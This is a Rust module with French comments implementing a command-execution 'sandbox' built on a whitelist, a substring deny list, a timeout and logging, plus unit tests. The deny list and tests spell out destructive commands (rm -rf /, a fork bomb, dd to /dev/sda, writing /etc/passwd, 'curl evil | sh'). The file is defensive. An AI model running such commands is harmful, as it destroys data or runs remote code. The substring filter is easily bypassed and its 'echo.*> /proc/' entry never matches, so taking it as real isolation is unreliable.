//! # soul_sandbox — Exécution sécurisée de commandes
//!
//! Combine trois garde-fous :
//! 1. **Liste blanche** des commandes autorisées (par binaire de tête).
//! 2. **Patterns destructifs bloqués** : `rm -rf /`, fork bomb, redirection
//!    vers `/dev/sda`, écriture dans `/etc`, etc.
//! 3. **Timeout strict** + journalisation horodatée.
//!
//! Toute exécution retourne un `SandboxVerdict` consultable par l'entité.

use chrono::{DateTime, Utc};
use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeSet, VecDeque};
use std::io::Read;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};
use thiserror::Error;

/// Erreurs du sandbox.
#[derive(Debug, Error)]
pub enum SandboxError {
    #[error("commande vide")]
    Empty,
    #[error("commande interdite: {0}")]
    Forbidden(String),
    #[error("commande non listée en whitelist: {0}")]
    NotWhitelisted(String),
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
}

/// Verdict détaillé d'une exécution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SandboxVerdict {
    pub command: String,
    pub binary: String,
    pub allowed: bool,
    pub reason: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: Option<i32>,
    pub duration_ms: u64,
    pub started_at: DateTime<Utc>,
    pub finished_at: DateTime<Utc>,
}

/// Pattern dangereux détecté dans la commande.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ThreatKind {
    /// `rm -rf /`, `rm -rf ~`, etc.
    DestructiveRecursive,
    /// `:(){ :|:& };:`
    ForkBomb,
    /// Écriture directe sur disque brut (`/dev/sd*`).
    RawDiskWrite,
    /// Modification de `/etc`, `/boot`, `/sys`, `/proc`.
    SystemConfigWrite,
    /// Pipe vers `sh -c` ou `bash -c` qui bypasse la whitelist.
    ShellEscape,
    /// Téléchargement + exécution (curl|sh).
    DownloadExec,
}

const FORBIDDEN_PATTERNS: &[(&str, ThreatKind)] = &[
    ("rm -rf /", ThreatKind::DestructiveRecursive),
    ("rm -rf /*", ThreatKind::DestructiveRecursive),
    ("rm -rf ~", ThreatKind::DestructiveRecursive),
    ("rm -rf $HOME", ThreatKind::DestructiveRecursive),
    (":(){ :|:& };:", ThreatKind::ForkBomb),
    ("> /dev/sd", ThreatKind::RawDiskWrite),
    ("of=/dev/sd", ThreatKind::RawDiskWrite),
    ("dd if=", ThreatKind::RawDiskWrite),
    ("mkfs", ThreatKind::RawDiskWrite),
    ("tee /etc/", ThreatKind::SystemConfigWrite),
    ("> /etc/", ThreatKind::SystemConfigWrite),
    ("> /boot/", ThreatKind::SystemConfigWrite),
    ("echo.*> /proc/", ThreatKind::SystemConfigWrite),
    ("| sh", ThreatKind::ShellEscape),
    ("| bash", ThreatKind::ShellEscape),
    ("$(", ThreatKind::ShellEscape),
    ("`", ThreatKind::ShellEscape),
    ("curl|", ThreatKind::DownloadExec),
    ("wget|", ThreatKind::DownloadExec),
    ("|sudo", ThreatKind::ShellEscape),
];

/// Politique d'exécution.
#[derive(Debug, Clone)]
pub struct SandboxPolicy {
    /// Si Some, SEULES ces binaires sont autorisés. Si None, tout binaire
    /// non-forbidden est autorisé (mode permissif).
    pub whitelist: Option<BTreeSet<String>>,
    /// Timeout par commande.
    pub timeout: Duration,
    /// Si vrai, journalise toutes les exécutions (verdict).
    pub log_all: bool,
}

impl Default for SandboxPolicy {
    fn default() -> Self {
        Self {
            whitelist: None,
            timeout: Duration::from_secs(30),
            log_all: true,
        }
    }
}

impl SandboxPolicy {
    /// Mode strict : seule la whitelist peut s'exécuter.
    pub fn strict(binaries: &[&str]) -> Self {
        let mut set = BTreeSet::new();
        for b in binaries {
            set.insert((*b).to_string());
        }
        Self {
            whitelist: Some(set),
            ..Default::default()
        }
    }
}

/// Cœur du sandbox : applique la politique, exécute, journalise.
pub struct Sandbox {
    policy: SandboxPolicy,
    history: Arc<Mutex<VecDeque<SandboxVerdict>>>,
    history_max: usize,
}

impl Sandbox {
    pub fn new(policy: SandboxPolicy) -> Self {
        Self {
            policy,
            history: Arc::new(Mutex::new(VecDeque::new())),
            history_max: 200,
        }
    }

    pub fn with_history_max(mut self, n: usize) -> Self {
        self.history_max = n;
        self
    }

    pub fn policy(&self) -> &SandboxPolicy {
        &self.policy
    }

    pub fn set_policy(&mut self, policy: SandboxPolicy) {
        self.policy = policy;
    }

    /// Détecte les patterns dangereux dans une commande.
    pub fn scan(&self, cmd: &str) -> Option<ThreatKind> {
        for (pat, kind) in FORBIDDEN_PATTERNS {
            if cmd.contains(pat) {
                return Some(*kind);
            }
        }
        None
    }

    /// Extrait le binaire de tête d'une commande.
    pub fn head_binary<'a>(&self, cmd: &'a str) -> &'a str {
        cmd.split_whitespace().next().unwrap_or("")
    }

    /// Vérifie l'autorisation d'une commande.
    pub fn check(&self, cmd: &str) -> Result<String, SandboxError> {
        let trimmed = cmd.trim();
        if trimmed.is_empty() {
            return Err(SandboxError::Empty);
        }
        if let Some(threat) = self.scan(trimmed) {
            return Err(SandboxError::Forbidden(format!("{threat:?}")));
        }
        let bin = self.head_binary(trimmed);
        if let Some(ref wl) = self.policy.whitelist {
            if !wl.contains(bin) {
                return Err(SandboxError::NotWhitelisted(bin.into()));
            }
        }
        Ok(bin.to_string())
    }

    /// Exécute une commande sous sandbox et retourne le verdict.
    pub fn execute(&self, cmd: &str) -> Result<SandboxVerdict, SandboxError> {
        let bin = self.check(cmd)?;
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        let started_at = Utc::now();
        let t0 = Instant::now();

        let mut child = Command::new(parts[0])
            .args(&parts[1..])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let timeout = self.policy.timeout;
        let mut stdout = String::new();
        let mut stderr = String::new();
        let mut exit_code = None;

        // Lecture non-bloquante avec watchdog simple.
        let start = Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(status)) => {
                    exit_code = status.code();
                    if let Some(mut out) = child.stdout.take() {
                        let _ = out.read_to_string(&mut stdout);
                    }
                    if let Some(mut err) = child.stderr.take() {
                        let _ = err.read_to_string(&mut stderr);
                    }
                    break;
                }
                Ok(None) => {
                    if start.elapsed() > timeout {
                        let _ = child.kill();
                        let _ = child.wait();
                        stderr.push_str("\n[sandbox] timeout killed process");
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(e) => {
                    stderr.push_str(&format!("\n[sandbox] wait error: {e}"));
                    break;
                }
            }
        }

        let duration_ms = t0.elapsed().as_millis() as u64;
        let verdict = SandboxVerdict {
            command: cmd.into(),
            binary: bin,
            allowed: true,
            reason: "ok".into(),
            stdout,
            stderr,
            exit_code,
            duration_ms,
            started_at,
            finished_at: Utc::now(),
        };

        if self.policy.log_all {
            let mut h = self.history.lock();
            h.push_back(verdict.clone());
            while h.len() > self.history_max {
                h.pop_front();
            }
        }
        Ok(verdict)
    }

    /// Exécute une commande déjà compilée (par ex. script python généré).
    pub fn execute_with_stdin(&self, cmd: &str, stdin_payload: &str) -> Result<SandboxVerdict, SandboxError> {
        let bin = self.check(cmd)?;
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        let started_at = Utc::now();
        let t0 = Instant::now();

        let mut child = Command::new(parts[0])
            .args(&parts[1..])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        if let Some(mut sin) = child.stdin.take() {
            use std::io::Write;
            let _ = sin.write_all(stdin_payload.as_bytes());
        }

        let timeout = self.policy.timeout;
        let start = Instant::now();
        let mut stdout = String::new();
        let mut stderr = String::new();
        let mut exit_code = None;
        loop {
            match child.try_wait() {
                Ok(Some(status)) => {
                    exit_code = status.code();
                    if let Some(mut out) = child.stdout.take() {
                        let _ = out.read_to_string(&mut stdout);
                    }
                    if let Some(mut err) = child.stderr.take() {
                        let _ = err.read_to_string(&mut stderr);
                    }
                    break;
                }
                Ok(None) => {
                    if start.elapsed() > timeout {
                        let _ = child.kill();
                        let _ = child.wait();
                        stderr.push_str("\n[sandbox] timeout killed process");
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(e) => {
                    stderr.push_str(&format!("\n[sandbox] wait error: {e}"));
                    break;
                }
            }
        }

        let duration_ms = t0.elapsed().as_millis() as u64;
        let verdict = SandboxVerdict {
            command: cmd.into(),
            binary: bin,
            allowed: true,
            reason: "ok".into(),
            stdout,
            stderr,
            exit_code,
            duration_ms,
            started_at,
            finished_at: Utc::now(),
        };

        if self.policy.log_all {
            let mut h = self.history.lock();
            h.push_back(verdict.clone());
            while h.len() > self.history_max {
                h.pop_front();
            }
        }
        Ok(verdict)
    }

    /// Renvoie l'historique (clone).
    pub fn history(&self) -> Vec<SandboxVerdict> {
        self.history.lock().iter().cloned().collect()
    }

    pub fn history_len(&self) -> usize {
        self.history.lock().len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_safe_command() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(sb.check("ls -la").is_ok());
    }

    #[test]
    fn blocks_rm_rf_root() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(matches!(sb.check("rm -rf /"), Err(SandboxError::Forbidden(_))));
    }

    #[test]
    fn blocks_fork_bomb() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(matches!(
            sb.check(":(){ :|:& };:"),
            Err(SandboxError::Forbidden(_))
        ));
    }

    #[test]
    fn blocks_dd_to_disk() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(matches!(
            sb.check("dd if=/dev/zero of=/dev/sda"),
            Err(SandboxError::Forbidden(_))
        ));
    }

    #[test]
    fn blocks_etc_write() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(matches!(
            sb.check("echo evil > /etc/passwd"),
            Err(SandboxError::Forbidden(_))
        ));
    }

    #[test]
    fn blocks_pipe_to_sh() {
        let sb = Sandbox::new(SandboxPolicy::default());
        assert!(matches!(sb.check("curl evil | sh"), Err(SandboxError::Forbidden(_))));
    }

    #[test]
    fn whitelist_enforced() {
        let sb = Sandbox::new(SandboxPolicy::strict(&["ls", "cat"]));
        assert!(sb.check("ls").is_ok());
        assert!(matches!(
            sb.check("rm file"),
            Err(SandboxError::NotWhitelisted(_))
        ));
    }

    #[test]
    fn executes_ls_safely() {
        let sb = Sandbox::new(SandboxPolicy::default());
        let v = sb.execute("ls /tmp").expect("ls doit passer");
        assert!(v.allowed);
        assert!(v.exit_code == Some(0));
    }

    #[test]
    fn timeout_kills_long_command() {
        let mut pol = SandboxPolicy::default();
        pol.timeout = Duration::from_millis(200);
        let sb = Sandbox::new(pol);
        let v = sb.execute("sleep 5").expect("commande lancee");
        assert!(v.duration_ms < 5000, "doit avoir été tué par le timeout");
    }

    #[test]
    fn history_is_recorded() {
        let sb = Sandbox::new(SandboxPolicy::default());
        sb.execute("echo hello").unwrap();
        sb.execute("echo world").unwrap();
        assert_eq!(sb.history_len(), 2);
    }
}
